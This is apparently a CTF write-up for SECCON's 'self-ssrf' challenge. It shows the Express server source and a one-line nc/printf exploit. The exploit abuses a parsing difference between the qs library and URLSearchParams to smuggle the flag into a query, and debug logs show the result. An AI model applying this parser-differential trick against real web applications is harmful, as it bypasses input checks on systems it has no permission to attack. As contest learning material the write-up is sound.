# self-ssrf

## Description

Source code provided

```js
import express from "express";

const PORT = 3000;
const LOCALHOST = new URL(`http://localhost:${PORT}`);
const FLAG = Bun.env.FLAG!!;

const app = express();

app.use("/", (req, res, next) => {
  if (req.query.flag === undefined) {
    const path = "/flag?flag=guess_the_flag";
    res.send(`Go to <a href="${path}">${path}</a>`);
  } else next();
});

app.get("/flag", (req, res) => {
  res.send(
    req.query.flag === FLAG // Guess the flag
      ? `Congratz! The flag is '${FLAG}'.`
      : `<marquee>🚩🚩🚩</marquee>`
  );
});

app.get("/ssrf", async (req, res) => {
  try {
    const url = new URL(req.url, LOCALHOST);

    if (url.hostname !== LOCALHOST.hostname) {
      res.send("Try harder 1");
      return;
    }
    if (url.protocol !== LOCALHOST.protocol) {
      res.send("Try harder 2");
      return;
    }

    url.pathname = "/flag";
    url.searchParams.append("flag", FLAG);
    res.send(await fetch(url).then((r) => r.text()));
  } catch {
    res.status(500).send(":(");
  }
});

app.listen(PORT);

```

## Writeup

After much struggle, I found my unintended solution in `qs` library: https://github.com/ljharb/qs/blob/ef0b96f9bcdfef626f3bdb8fad89597f0cf0bc90/lib/parse.js#L100

```bash
printf 'GET http://localhost:3000/ssrf?&flag[=]= HTTP/1.1\r\nHost: a\r\n\r\n' | timeout 1 nc -v self-ssrf.seccon.games 3000
```

Due to the difference between parsing of `qs` and `URLSearchParams`, I can leverage that to append the flag to the query string correctly.

```
# ... initial request
chall-1  | req.url http://localhost:3000/ssrf?flag[=]=
chall-1  | req.query {
chall-1  |   flag: {                           # <------------
chall-1  |     "=": "",
chall-1  |   },
chall-1  | }
chall-1  | url URL {
chall-1  |   href: "http://localhost:3000/ssrf?flag[=]=",
chall-1  |   origin: "http://localhost:3000",
chall-1  |   protocol: "http:",
chall-1  |   username: "",
chall-1  |   password: "",
chall-1  |   host: "localhost:3000",
chall-1  |   hostname: "localhost",
chall-1  |   port: "3000",
chall-1  |   pathname: "/ssrf",
chall-1  |   hash: "",
chall-1  |   search: "?flag[=]=",
chall-1  |   searchParams: URLSearchParams {   # <------------
chall-1  |     "flag[": "]=",
chall-1  |   },
chall-1  |   toJSON: [Function: toJSON],
chall-1  |   toString: [Function: toString],
chall-1  | }
chall-1  | url before send http://localhost:3000/flag?flag%5B=%5D%3D&flag=SECCON%7Bdummy%7D

# ... the request made by fetch() ...
chall-1  | ---
chall-1  | req.url /flag?flag%5B=%5D%3D&flag=SECCON%7Bdummy%7D
chall-1  | req.query {
chall-1  |   "flag[": "]=",                    # <------------
chall-1  |   flag: "SECCON{dummy}",
chall-1  | }

```

Was fun!